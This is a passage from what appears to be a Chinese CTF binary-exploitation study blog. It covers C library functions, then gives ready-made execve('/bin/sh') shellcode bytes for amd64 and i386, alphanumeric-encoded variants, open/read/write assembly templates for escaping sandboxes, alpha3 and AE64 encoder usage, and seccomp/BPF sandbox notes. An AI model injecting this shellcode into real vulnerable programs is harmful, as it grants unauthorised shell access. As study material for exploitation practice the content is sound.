flags</span><br></pre></td></tr></table></figure><p>：指定映射的特性和行为，可以使用以下标志的按位或进行组合：</p><ul><li><code>MAP_SHARED</code>：共享映射，对映射区域的修改会影响到其他映射该文件的进程。</li><li><code>MAP_PRIVATE</code>：私有映射，对映射区域的修改不会影响到其他映射该文件的进程。</li><li><code>MAP_FIXED</code>：强制指定映射的起始地址，如果该地址已经被占用，则会失败。</li><li><code>MAP_ANONYMOUS</code>：创建一个匿名映射，不与具体的文件关联。</li></ul></li><li><p><code>fd</code>：指定要映射的文件的文件描述符。如果使用匿名映射，则将该参数设置为-1。</p></li><li><p><code>offset</code>：指定映射的文件偏移量，表示从文件的哪个位置开始映射。对于匿名映射，该参数应该设置为0。</p></li></ul><p>返回值为映射区域的起始地址，如果映射失败，则返回<code>MAP_FAILED</code>（-1）。</p><p>需要注意的是，mmap函数只能用于映射普通文件、设备文件或者匿名映射，不能用于映射目录文件。在使用完映射区域后，应当使用munmap函数来解除映射关系，释放对应的资源。</p><h2 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h2><p><code>void *memset(void *s, int c, size_t n);</code></p><p>参数说明如下：</p><ul><li><code>s</code>：指向要设置值的内存区域的指针。</li><li><code>c</code>：要设置的值，以整数形式表示。虽然该参数被声明为int类型，但实际上只使用了其低8位的值。</li><li><code>n</code>：要设置的内存区域的大小，以字节为单位。</li></ul><p>返回值为指向内存区域起始地址的指针，即参数<code>s</code>的值。</p><p>该函数将指定的值 <code>c</code> 复制到 <code>s</code> 指向的内存区域的前 <code>n</code> 个字节中，即将内存区域中的每个字节设置为相同的值。</p><p>需要注意的是，由于 <code>memset</code> 函数操作的是字节级别的赋值，对于非字符类型的数据（如整型、浮点型等），在使用 <code>memset</code> 进行赋值时，可能会出现不符合预期的结果。因此，对于非字符类型的数据，推荐使用其他适当的方式进行赋值操作。</p><h2 id="strtok"><a href="#strtok" class="headerlink" title="strtok"></a>strtok</h2><p><code>char *strtok(char *str, const char *delim);</code></p><ul><li><code>str</code>: 要被分割的字符串。在第一次调用时传入原始字符串，在后续调用中传入 <code>NULL</code>。</li><li><code>delim</code>: 分隔符字符串，用于指定在哪些字符上进行分割。</li></ul><p>每次调用 <code>strtok</code> 都会返回一个指向分割后子字符串的指针，并将原始字符串中的分隔符替换为 <code>NULL</code>。需要注意的是，在使用 <code>strtok</code> 函数时，原始字符串会被修改，因为分隔符被替换为 <code>NULL</code>。如果你需要保留原始字符串不变，可以先复制一份原始字符串，然后使用 <code>strtok</code> 函数来操作复制后的字符串。</p><p>注意事项：</p><ol><li><code>strtok</code> 函数会修改原始字符串，将分隔符位置替换为 <code>NULL</code>，所以在使用时要小心不要破坏原始数据。</li><li><code>strtok</code> 使用静态变量来记录分割的位置，所以不是线程安全的。在多线程环境中，可以使用 <code>strtok_r</code> 或其他线程安全的替代函数。</li></ol><h2 id="allloca"><a href="#allloca" class="headerlink" title="allloca"></a>allloca</h2><p><code>alloca()</code> 是一个基于栈进行内存分配的函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;alloca.<span class="property">h</span>&gt;</span><br></pre></td></tr></table></figure><p>该函数成功时，会返回一个指向 size 字节大小的内存指针。</p><p>这块内存是在栈中的。所以，从函数返回时，它会被自动释放。失败时（size 过大），可能会存在栈溢出问题（可能会指向堆区或者其它区域）。</p><p>在栈上分配,sp寄存器会随之变化,但反编译伪代码一般不会体现,注意</p><h2 id="mallopt"><a href="#mallopt" class="headerlink" title="mallopt"></a>mallopt</h2><p><code>mallopt</code> 是C语言标准库中的函数，用于设置动态内存分配（使用<code>malloc</code>、<code>calloc</code>、<code>realloc</code> 等函数）的参数。它允许您调整内存分配器的行为，以优化内存管理和性能。</p><p>以下是 <code>mallopt</code> 函数的原型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cCopy code#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int mallopt(int param, int value);</span><br></pre></td></tr></table></figure><ul><li><code>param</code>：表示要设置的参数编号，用于指定要调整哪个特定的内存分配器参数。参数的编号和可用的选项可能会因编译器、操作系统以及标准库的不同而有所不同。</li><li><code>value</code>：表示要设置的参数值。具体的值与参数编号相关，不同的参数可能有不同的取值范围和意义。</li></ul><p><code>mallopt</code> 函数的作用是在运行时调整内存分配器的行为，以便更好地适应应用程序的特定需求。它可以用于优化内存分配的性能、减少内存碎片、改变内存池的大小等等。这对于需要高效管理内存的应用程序特别有用，例如服务器应用、嵌入式系统以及需要处理大量数据的应用。</p><p>例如<code>mallopt(1,0);</code>是禁用fastbin</p><h2 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h2><p><code>strstr</code>是一个在C语言和C++中常用的字符串处理函数。它用于在一个字符串中查找另一个子字符串（也称为子序列）的第一次出现的位置。函数的原型通常如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">char *strstr(const char *haystack, const char *needle);</span><br></pre></td></tr></table></figure><p>这个函数接受两个参数：</p><ul><li><code>haystack</code>：要在其中查找的源字符串。</li><li><code>needle</code>：要查找的子字符串。</li></ul><p>函数会在<code>haystack</code>中查找第一次出现的与<code>needle</code>相匹配的子字符串，并返回一个指向该位置的指针。如果找不到匹配的子字符串，函数会返回<code>NULL</code></p><h2 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h2><p>gets本身没什么好说的,但是gets的返回值是指向读取的字符串的指针,这一点在某些特殊的地方可以被利用</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1>]]></content>
      
      
      <categories>
          
          <category> 杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c库函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SunmerWeek1</title>
      <link href="/posts/33429/"/>
      <url>/posts/33429/</url>
      
        <content type="html"><![CDATA[<h1 id="任务Ⅰ—-shellcode相关"><a href="#任务Ⅰ—-shellcode相关" class="headerlink" title="任务Ⅰ—-shellcode相关"></a>任务Ⅰ—-shellcode相关</h1><h2 id="shellcode-getshell"><a href="#shellcode-getshell" class="headerlink" title="shellcode(getshell)"></a>shellcode(getshell)</h2><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><p><strong>22字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05</span><br></pre></td></tr></table></figure><p>需要确保rax高位本来就是0</p><p><strong>23字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br></pre></td></tr></table></figure><p><strong>53字节,pwntools:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x48\x89\xE7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xF6\x56\x6A\x08\x5E\x48\x01\xE6\x56\x48\x89\xE6\x31\xD2\xFF\x34\x25\x00\x00\x00\x00\x58\x0F\x05</span><br></pre></td></tr></table></figure><p><strong>纯ascii大小写字母加数字表示的shellcode:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><p><strong>18字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x0B\x58\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80</span><br></pre></td></tr></table></figure><p><strong>21字节:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure><p><strong>48字节,pwntools:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6A\x68\x68\x2F\x2F\x2F\x73\x68\x2F\x62\x69\x6E\x89\xE3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xC9\x51\x6A\x04\x59\x01\xE1\x51\x89\xE1\x31\xD2\xFF\x35\x00\x00\x00\x00\x58\xCD\x80</span><br></pre></td></tr></table></figure><p><strong>纯ascii大小写字母加数字表示的shellcode:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br></pre></td></tr></table></figure><h2 id="shellcode-orw"><a href="#shellcode-orw" class="headerlink" title="shellcode(orw)"></a>shellcode(orw)</h2><h3 id="i386-1"><a href="#i386-1" class="headerlink" title="i386"></a>i386</h3><p>采用int 0x80系统中断达到系统调用</p><p>eax存放系统调用号并在调用结束存储返回值,ebx,ecx,edx,esi,edi依次为参数,与函数调用约定存放在栈中不同</p><h4 id="open-返回文件流序号fd"><a href="#open-返回文件流序号fd" class="headerlink" title="open(返回文件流序号fd)"></a>open(返回文件流序号fd)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">push ecx    ;文件名结束&#x27;\x00&#x27;</span><br><span class="line">push 文件名ascii-&gt;小端序数据</span><br><span class="line">mov ebx,esp ;文件名在栈中</span><br><span class="line">xor edx,edx ;int mode</span><br><span class="line">mov eax,5   ;sys_open</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax   ;上一步返回的fd存储在eax</span><br><span class="line">mov ecx,esp   ;写在何处,一般直接在栈上,也可以在别处</span><br><span class="line">mov edx,0x??  ;大小</span><br><span class="line">mov eax,3     ;sys_read</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,1     ;mov ebx,2也行</span><br><span class="line">/*0标准输入,1标准输出,2标准错误*/</span><br><span class="line">mov edx,0x??  ;大小</span><br><span class="line">mov eax,4     ;sys_write</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h3 id="amd64-1"><a href="#amd64-1" class="headerlink" title="amd64"></a>amd64</h3><p>与i386大同小异</p><p>采用syscall系统调用</p><p>rax存放系统调用号并在调用结束存储返回值,rdi,rsi,rdx,rcx,r8,r9依次为参数,与函数调用约定一致</p><h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push rdx   ;文件名结束&#x27;\x00&#x27;,也可以添加在文件名其实</span><br><span class="line">push 文件名ascii-&gt;小端序数据</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,2   ;直接mov rax,2要更长</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov dl,0x??</span><br><span class="line">mov al,0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h4 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor rdi,rdi</span><br><span class="line">mov edi,1</span><br><span class="line">mov al,1;</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="纯可见字符shellcode"><a href="#纯可见字符shellcode" class="headerlink" title="纯可见字符shellcode"></a>纯可见字符shellcode</h2><p>相关资料</p><p><a href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode</a></p><p><a href="https://web.archive.org/web/20110716082815/http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes">x86纯字符编码表</a></p><p><a href="https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes">x64纯字符编码表</a></p><h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>其是一个python2的脚本</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h4><p>先生成shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line">print asm(sc)</span><br></pre></td></tr></table></figure><p>保存到aplha3目录下</p><p><code>python2 sc.py &gt; payload</code></p><p>生成纯可见字符alpha shellcode</p><p><code>python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;payload&quot;</code></p><p><strong>参数分析:</strong></p><ul><li>x64  选择位数[可选x86]</li><li>ascii mixedcase 选择字符表[可选ascii uppercase (数字+大写字母)   ascii lowercase (数字+小写字母)   ascii mixedcase (数字+大小写字母)]</li><li>rax 用于编码的寄存器(shellcode基址)  见下引例</li><li>—input=’’  输入文件</li></ul><p>比如有如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00101246 48 8d     LEA    RAX,[RBP + -0x410]</span><br><span class="line">         85 f0 </span><br><span class="line">         fb ff </span><br><span class="line">0010124d ff d0     CALL   RAX</span><br><span class="line">; ...</span><br></pre></td></tr></table></figure><p>通过call rax跳转到shellcode，那么alpha3命令中<strong>用于编码的寄存器就是rax</strong></p><p><strong>shellcode的起始地址存在哪个寄存器中，用于编码的寄存器就是哪个</strong></p><hr><p><strong>alpha3支持的所有编码方式如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Valid base address examples for each encoder, ordered by encoder settings,</span><br><span class="line">are:</span><br><span class="line"></span><br><span class="line">[x64 ascii mixedcase]</span><br><span class="line">  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI</span><br><span class="line"></span><br><span class="line">[x86 ascii lowercase]</span><br><span class="line">  AscLow 0x30 (rm32)        ECX EDX EBX</span><br><span class="line"></span><br><span class="line">[x86 ascii mixedcase]</span><br><span class="line">  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]</span><br><span class="line">                            ECX+2 ESI+4 ESI+8</span><br><span class="line">  AscMix 0x30 (i32)         (address)</span><br><span class="line">  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty</span><br><span class="line">                            countslide:EBX+offset~uncertainty</span><br><span class="line">                            countslide:ECX+offset~uncertainty</span><br><span class="line">                            countslide:EDX+offset~uncertainty</span><br><span class="line">                            countslide:ESI+offset~uncertainty</span><br><span class="line">                            countslide:EDI+offset~uncertainty</span><br><span class="line">  AscMix Countslide (i32)   countslide:address~uncertainty</span><br><span class="line">  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3</span><br><span class="line"></span><br><span class="line">[x86 ascii uppercase]</span><br><span class="line">  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br><span class="line"></span><br><span class="line">[x86 latin-1 mixedcase]</span><br><span class="line">  Latin1Mix CALL GetPC      call</span><br><span class="line"></span><br><span class="line">[x86 utf-16 uppercase]</span><br><span class="line">  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]</span><br><span class="line">                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]</span><br></pre></td></tr></table></figure><h3 id="ae64"><a href="#ae64" class="headerlink" title="ae64"></a>ae64</h3><p><a href="https://github.com/veritas501/ae64">AE64</a>是杭电的一位大师傅写的python3脚本工具，专用于生成64位的aplha shellcode。</p><p>AE64的优势在于编码时可以更加灵活地使用寄存器，但是生成的alpha shellcode比alpha3要更长一些。</p><p>此外AE64是python写的，可以直接在python中调用，以下是官方的栗子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./example1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">&#x27;r13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅱ—-sandbox学习"><a href="#任务Ⅱ—-sandbox学习" class="headerlink" title="任务Ⅱ—-sandbox学习"></a>任务Ⅱ—-sandbox学习</h1><p>ctf中一般使用seccomp有两种方法，一种是用<strong>prctl</strong>，另一种是用<strong>seccomp</strong></p><p>其一般都会禁用execve函数，使之无法直接getshell</p><p><strong>seccomp函数本身会申请chunk，所以堆块结构初始会有一些不同,也就是一些师傅说的影响堆的风水</strong></p><p>主要是seccomp_rule_add和seccomp_load这两个函数影响了tcache和fastbin的风水。</p><p><strong>prctl则貌似不会</strong></p><h2 id="BPF"><a href="#BPF" class="headerlink" title="BPF"></a>BPF</h2><p>BPF即伯克利包过滤器(Berkeley Packets Filter)</p><p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p><p>总结起来就下面的一些点：</p><ol><li><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP</li><li><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</li><li><strong>BPF 条件判断跳转指令</strong>：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。</li><li><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</li></ol><p>其可以用于沙箱的的实现</p><p><strong>例如</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),          <span class="comment">// 从第0个字节位置开始，加载读取系统调用号</span></span><br><span class="line">    BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">257</span>, <span class="number">1</span>, <span class="number">0</span>),       <span class="comment">// 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行</span></span><br><span class="line">    BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),         <span class="comment">// 比较系统调用号是否大于 0，是就跳到第6行</span></span><br><span class="line">    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), <span class="comment">// 拒绝系统调用，返回 0</span></span><br><span class="line">    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), <span class="comment">// 允许系统调用</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="prctl函数实现"><a href="#prctl函数实现" class="headerlink" title="prctl函数实现"></a>prctl函数实现</h2><p>这个函数可以对进程就行操作，<strong>第一个参数可以指定你想做的事</strong>，因此第一个参数的可选项非常多。</p><p>第一个参数常见的为<code>38(PR_SET_NO_NEW_PRIVS)</code>和<code>22(PR_SET_SECCOMP)</code>两种情况</p><h3 id="38-PR-SET-NO-NEW-PRIVS"><a href="#38-PR-SET-NO-NEW-PRIVS" class="headerlink" title="38(PR_SET_NO_NEW_PRIVS)"></a>38(PR_SET_NO_NEW_PRIVS)</h3><p>简单的说就是如果 option 设置为 <code>PR_SET_NO_NEW_PRIVS</code> 的话，第二个参数如果设置为 1 的话，<strong>不能够进行 execve 的系统调用，同时这个选项还会继承给子进程</strong>。</p><p><strong>只能进行几个系统调用：open、write、read</strong>。</p><h3 id="22-PR-SET-SECCOMP"><a href="#22-PR-SET-SECCOMP" class="headerlink" title="22(PR_SET_SECCOMP)"></a>22(PR_SET_SECCOMP)</h3><ul><li>第二个参数为1时，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</li><li>第二个参数为2时，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则</li></ul><h2 id="seccomp实现"><a href="#seccomp实现" class="headerlink" title="seccomp实现"></a>seccomp实现</h2><p>一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);    </span><br><span class="line">&#125;</span><br><span class="line">seccomp_init \\</span><br><span class="line">scmp_filter_ctx <span class="title function_">seccomp_init</span><span class="params">(<span class="type">uint32_t</span> def_action)</span>;</span><br><span class="line">initialize the internal seccomp filter state, prepares it <span class="keyword">for</span> use, and sets the <span class="keyword">default</span> action based on the def_action parameter</span><br></pre></td></tr></table></figure><p>seccomp_init 返回的是一个 scmp_filter_ctx 的结构体</p><p>有效的 def_action 有下面几种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SCMP_ACT_KILL</span><br><span class="line">SCMP_ACT_KILL_PROCESS</span><br><span class="line">SCMP_ACT_TRAP</span><br><span class="line">SCMP_ACT_ERRNO</span><br><span class="line">SCMP_ACT_TRACE</span><br><span class="line">SCMP_ACT_LOG</span><br><span class="line">SCMP_ACT_ALLOW</span><br></pre></td></tr></table></figure><p>其中<code>SCMP_ACT_KILL</code> 和 <code>SCMP_ACT_ALLOW</code>，一个是白名单，一个是黑名单</p><p><code>seccomp_rule_add</code>可以添加规则</p><p><code>int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action,int syscall, unsigned int arg_cnt, ...);</code></p><p>arg_cnt 这个是指后面跟随的参数的个数，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                      SCMP_A0(SCMP_CMP_EQ, fd),</span><br><span class="line">                      SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>)buf),</span><br><span class="line">                      SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">1</span>,</span><br><span class="line">                      SCMP_CMP(<span class="number">0</span>, SCMP_CMP_EQ, fd));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>分别是 3 ，1，0 个。然后后面的参数就是 comparison op,主要有下面几种</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SCMP_CMP_NE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> <span class="built_in">not</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_NE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , 